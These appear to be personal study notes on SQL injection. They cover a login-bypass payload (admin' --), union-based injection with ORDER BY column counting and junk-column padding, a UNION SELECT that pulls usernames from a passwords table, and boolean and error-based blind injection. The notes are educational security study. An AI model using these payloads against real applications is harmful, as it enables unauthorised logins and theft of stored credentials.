
login: admin
password: dog
```

select * from users where username='admin'
```


login: admin' --
```
										   -> COMMENTED OUT
select * from users where username='admin' --' AND PASSWORD='X'
```

# TYPES OF SQLI

![](Pasted%20image%2020250405000042.png)

7
# UNION BASED SQL INJECTION

#### rules
- **number of columns matter**,   if the original query selects 2 values, the union must also select 2 values. 
	 enumerate number of columns with
```
order by  n--      #where n is a number and the -- is the injection comment out
```
![](Pasted%20image%2020250405002249.png)

- **data type matters**, make sure the value that union is selecting has the same data type as the original statement. `a` string/char/varchar type 
`select username, password`
` column 1, column 2` both column 1 and 2 data type must match eg: `string`
 
 ---
## Un-even Columns

We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that. For example, suppose we only had one column. In that case, we want to `SELECT`, we can put junk data for the remaining required columns so that the total number of columns we are `UNION`ing with remains the same as the original query.

For example, we can use any string as our junk data, and the query will return the string as its output for that column. If we `UNION` with the string `"junk"`, the `SELECT` query would be `SELECT "junk" from passwords`, which will always return `junk`. We can also use numbers. For example, the query `SELECT 1 from passwords` will always return `1` as the output.

Note: When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.

Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

The `products` table has two columns in the above example, so we have to `UNION` with two columns. If we only wanted to get one column 'e.g. `username`', we have to do `username, 2`, such that we have the same number of columns:

Code: sql

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. For example, if the original query used `SELECT` on a table with four columns, our `UNION` injection would be:

Code: sql

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

This query would return:
```shell-session
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

As we can see, our wanted output of the '`UNION SELECT username from passwords`' query is found at the first column of the second row, while the numbers filled the remaining columns.



## locations where database queries can be ran and injection points
### query parameters
```
?category=bags
```

## Blind based SQL injection

### BOLEAN BASED
look for indicator of success /false
ex: welcome back`1` , no welcome back `0`

### error based
error = false
no error = true

